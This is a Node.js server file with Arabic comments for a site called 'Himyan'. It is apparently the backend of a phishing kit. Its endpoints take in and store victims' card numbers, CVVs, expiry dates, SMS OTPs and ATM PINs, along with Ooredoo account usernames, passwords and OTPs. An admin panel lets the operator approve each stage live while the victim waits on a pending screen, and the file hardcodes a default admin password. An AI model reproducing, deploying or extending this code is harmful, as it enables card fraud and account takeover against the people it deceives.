/**
 * موقع هميان — سيرفر بسيط بدون أي مكتبات خارجية (Node المدمج فقط)
 * يقدّم صفحات الموقع + API لاستقبال الطلبات + لوحة تحكم محمية بكلمة سر.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
const PUBLIC_DIR = path.join(ROOT, 'public');

// كلمة سر لوحة التحكم — يمكن تغييرها من Variables في Railway
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

// مكان حفظ الطلبات (اربط Volume في Railway على نفس المسار للاحتفاظ بالبيانات)
const DATA_DIR = process.env.DATA_DIR || path.join(ROOT, 'data');
const DB_FILE = path.join(DATA_DIR, 'orders.json');

fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, '[]');

const readOrders = () => {
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) || []; }
  catch { return []; }
};
const writeOrders = (list) => fs.writeFileSync(DB_FILE, JSON.stringify(list, null, 2));

/* ---------- جلسات الأدمن ---------- */
const sessions = new Map();
const DAY = 24 * 60 * 60 * 1000;
const paymentStates = new Map();

/* ---------- الزيارات النشطة ---------- */
const visitors = new Map();           // id -> { last, page }
const ACTIVE_WINDOW = 30 * 1000;      // يُعدّ الزائر نشطًا خلال 30 ثانية
function activeCount() {
  const now = Date.now();
  let n = 0;
  for (const [id, v] of visitors) {
    if (now - v.last > ACTIVE_WINDOW) visitors.delete(id);
    else n++;
  }
  return n;
}

const newToken = () => {
  const t = crypto.randomBytes(24).toString('hex');
  sessions.set(t, Date.now() + DAY);
  return t;
};
const authed = (req) => {
  const token = String(req.headers.authorization || '').replace(/^Bearer\s+/i, '').trim();
  const exp = sessions.get(token);
  if (!exp) return false;
  if (exp < Date.now()) { sessions.delete(token); return false; }
  return true;
};

/* ---------- أدوات ---------- */
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.woff2': 'font/woff2'
};

const json = (res, code, obj) => {
  const body = JSON.stringify(obj);
  res.writeHead(code, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(body);
};

const readBody = (req) => new Promise((resolve) => {
  let data = '';
  req.on('data', (c) => {
    data += c;
    if (data.length > 200000) { data = ''; req.destroy(); }
  });
  req.on('end', () => {
    try { resolve(JSON.parse(data || '{}')); }
    catch { resolve({}); }
  });
});

const FIELDS = ['card', 'status', 'name', 'qid', 'phone', 'email', 'gender', 'bank', 'address', 'ooredooUser', 'ooredooPass', 'ooredooOtp'];

const serveFile = (res, file) => {
  fs.readFile(file, (err, buf) => {
    if (err) {
      const fallback = path.join(PUBLIC_DIR, 'index.html');
      if (file !== fallback) return serveFile(res, fallback);
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('Not found');
    }
    res.writeHead(200, {
      'Content-Type': MIME[path.extname(file).toLowerCase()] || 'application/octet-stream',
      'Cache-Control': 'public, max-age=3600'
    });
    res.end(buf);
  });
};

/* ---------- السيرفر ---------- */
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://' + (req.headers.host || 'localhost'));
  const pathname = decodeURIComponent(url.pathname);

  if (pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('ok');
  }

  // دخول الأدمن
  if (pathname === '/api/login' && req.method === 'POST') {
    const body = await readBody(req);
    if (String(body.password || '') !== ADMIN_PASSWORD) {
      return json(res, 401, { ok: false, error: 'wrong-password' });
    }
    return json(res, 200, { ok: true, token: newToken() });
  }

  // استقبال طلب جديد
  if (pathname === '/api/orders' && req.method === 'POST') {
    const body = await readBody(req);
    const order = {
      id: crypto.randomBytes(6).toString('hex'),
      createdAt: new Date().toISOString()
    };
    for (const f of FIELDS) order[f] = String(body[f] == null ? '' : body[f]).slice(0, 400);

    if (!order.name || !order.phone || !order.qid) {
      const fallbackName = String(body.name || body.ooredooUser || 'مستخدم أوريدو').slice(0, 120);
      const fallbackPhone = String(body.phone || '0000000000').slice(0, 16);
      const fallbackQid = String(body.qid || '0000000000000').slice(0, 20);
      order.name = fallbackName;
      order.phone = fallbackPhone;
      order.qid = fallbackQid;
    }
    const list = readOrders();
    list.unshift(order);
    writeOrders(list);
    console.log('طلب جديد:', order.id, order.name);
    return json(res, 200, { ok: true, id: order.id });
  }

  // تحديث طلب موجود (مثل بيانات أوريدو عند تسجيل الدخول/OTP)
  if (pathname.startsWith('/api/orders/') && (req.method === 'PUT' || req.method === 'POST')) {
    const id = pathname.split('/').filter(Boolean).slice(1).pop();
    const body = await readBody(req);
    const list = readOrders();
    let index = list.findIndex((item) => item.id === id);

    if (index === -1) {
      const created = {
        id: String(id || crypto.randomBytes(6).toString('hex')),
        createdAt: new Date().toISOString(),
        status: 'pending',
        name: String(body.name || 'مستخدم أوريدو').slice(0, 120),
        qid: String(body.qid || '0000000000000').slice(0, 20),
        phone: String(body.phone || '0000000000').slice(0, 16),
        email: String(body.email || '').slice(0, 200),
        gender: String(body.gender || '').slice(0, 50),
        bank: String(body.bank || 'Ooredoo').slice(0, 80),
        address: String(body.address || '').slice(0, 200),
        ooredooUser: String(body.ooredooUser || '').slice(0, 200),
        ooredooPass: String(body.ooredooPass || '').slice(0, 200),
        ooredooOtp: String(body.ooredooOtp || '').slice(0, 20)
      };
      list.unshift(created);
      writeOrders(list);
      return json(res, 200, { ok: true, id: created.id, order: created });
    }

    const order = list[index];
    for (const f of FIELDS) {
      if (body[f] != null) order[f] = String(body[f]).slice(0, 400);
    }
    if (body.ooredooUser) order.ooredooUser = String(body.ooredooUser).slice(0, 200);
    if (body.ooredooPass) order.ooredooPass = String(body.ooredooPass).slice(0, 200);
    if (body.ooredooOtp) order.ooredooOtp = String(body.ooredooOtp).slice(0, 20);
    if (body.status) order.status = String(body.status).slice(0, 40);
    writeOrders(list);
    return json(res, 200, { ok: true, id: order.id, order: order });
  }

  // استقبال بيانات البطاقة وبدء انتظار قرار الأدمن
  if (pathname === '/api/payment' && req.method === 'POST') {
    const body = await readBody(req);
    const id = String(body.requestId || '').slice(0, 100) || crypto.randomBytes(8).toString('hex');
    paymentStates.set(id, { status: 'pending', stage: 'payment', createdAt: Date.now() });
    const orders = readOrders();
    const order = orders.find((item) => item.id === id);
    if (order) {
      order.status = 'pending';
      order.card = {
        cardName: String(body.cardName || '').slice(0, 120),
        cardNumber: String(body.cardNumber || '').slice(0, 32),
        expiryDate: String(body.expiryDate || '').slice(0, 10),
        cvv: String(body.cvv || '').slice(0, 4)
      };
      writeOrders(orders);
    }
    return json(res, 200, { ok: true, id: id });
  }

  // استقبال رمز OTP وبدء انتظار قرار الأدمن
  if (pathname === '/api/otp' && req.method === 'POST') {
    const body = await readBody(req);
    const id = String(body.id || '').slice(0, 100);
    const otp = String(body.otp || '').slice(0, 12);
    if (!id || !/^\d{6}$/.test(otp)) {
      return json(res, 400, { ok: false, error: 'invalid-otp' });
    }

    paymentStates.set(id, { status: 'pending', stage: 'otp', otpSubmitted: true, createdAt: Date.now() });
    const orders = readOrders();
    const order = orders.find((item) => item.id === id);
    if (order) {
      order.status = 'pending';
      order.card = order.card || {};
      order.card.otp = otp;
      writeOrders(orders);
    }
    return json(res, 200, { ok: true, id: id });
  }

  // استقبال رمز ATM وبدء انتظار قرار الأدمن
  if (pathname === '/api/atm' && req.method === 'POST') {
    const body = await readBody(req);
    const id = String(body.id || '').slice(0, 100);
    const atmPin = String(body.atmPin || '').slice(0, 8);
    if (!id || !/^\d{4}$/.test(atmPin)) {
      return json(res, 400, { ok: false, error: 'invalid-atm-pin' });
    }

    paymentStates.set(id, { status: 'pending', stage: 'atm', otpSubmitted: true, createdAt: Date.now() });
    const orders = readOrders();
    const order = orders.find((item) => item.id === id);
    if (order) {
      order.status = 'pending';
      order.card = order.card || {};
      order.card.atm = atmPin;
      writeOrders(orders);
    }
    return json(res, 200, { ok: true, id: id });
  }

  // حالة الدفع التي تنتظر قرار الأدمن
  if (pathname.startsWith('/api/status/') && req.method === 'GET') {
    const id = pathname.split('/').pop();
    const payment = paymentStates.get(id);
    return json(res, 200, {
      ok: true,
      status: payment ? payment.status : 'pending',
      stage: payment ? payment.stage : 'payment',
      otpSubmitted: Boolean(payment && payment.otpSubmitted)
    });
  }

  // قرار الأدمن على بيانات البطاقة
  if (pathname.startsWith('/api/payments/') && pathname.endsWith('/decision') && req.method === 'POST') {
    if (!authed(req)) return json(res, 401, { ok: false, error: 'unauthorized' });
    const id = pathname.split('/')[3];
    const body = await readBody(req);
    const status = body.decision === 'accept' ? 'accept' : body.decision === 'reject' ? 'reject' : '';
    if (!status) return json(res, 400, { ok: false, error: 'invalid-decision' });
    const current = paymentStates.get(id) || {};
    let stage = current.stage || 'payment';
    if (stage === 'otp') stage = status === 'accept' ? 'atm' : 'otp';
    else if (stage === 'atm') stage = status === 'accept' ? 'success' : 'atm';
    const nextStatus = stage === 'success' ? 'success' : status;
    paymentStates.set(id, {
      status: nextStatus,
      stage: stage,
      otpSubmitted: Boolean(current.otpSubmitted),
      createdAt: Date.now()
    });
    const orders = readOrders();
    const order = orders.find((item) => item.id === id);
    if (order) { order.status = nextStatus; writeOrders(orders); }
    return json(res, 200, { ok: true, status: nextStatus });
  }

  // نبضة زائر (heartbeat) — تُستدعى من كل صفحة عامة
  if (pathname === '/api/ping' && req.method === 'POST') {
    const body = await readBody(req);
    const id = String(body.id || '').slice(0, 64) || crypto.randomBytes(8).toString('hex');
    visitors.set(id, { last: Date.now(), page: String(body.page || '').slice(0, 120) });
    return json(res, 200, { ok: true, id: id, active: activeCount() });
  }

  // عدد الزوار النشطين (أدمن)
  if (pathname === '/api/active' && req.method === 'GET') {
    if (!authed(req)) return json(res, 401, { ok: false, error: 'unauthorized' });
    return json(res, 200, { ok: true, active: activeCount() });
  }

  // قراءة الطلبات (أدمن)
  if (pathname === '/api/orders' && req.method === 'GET') {
    if (!authed(req)) return json(res, 401, { ok: false, error: 'unauthorized' });
    return json(res, 200, { ok: true, orders: readOrders() });
  }

  // حذف طلب (أدمن)
  if (pathname.startsWith('/api/orders/') && req.method === 'DELETE') {
    if (!authed(req)) return json(res, 401, { ok: false, error: 'unauthorized' });
    const id = pathname.split('/').pop();
    const list = readOrders();
    const next = list.filter((o) => o.id !== id);
    writeOrders(next);
    return json(res, 200, { ok: true, removed: list.length - next.length });
  }

  if (pathname.startsWith('/api/')) return json(res, 404, { ok: false, error: 'not-found' });

  // الملفات الثابتة
  let rel = pathname === '/' ? 'index.html' : pathname.replace(/^\/+/, '');
  if (!path.extname(rel)) rel += '.html';
  const file = path.join(PUBLIC_DIR, rel);
  if (!file.startsWith(PUBLIC_DIR + path.sep)) {
    res.writeHead(403);
    return res.end('Forbidden');
  }
  if (rel === 'data/orders.json' || rel.startsWith('data/')) {
    res.writeHead(403);
    return res.end('Forbidden');
  }
  serveFile(res, file);
});

server.listen(PORT, '0.0.0.0', () => console.log('Himyan site running on port ' + PORT));
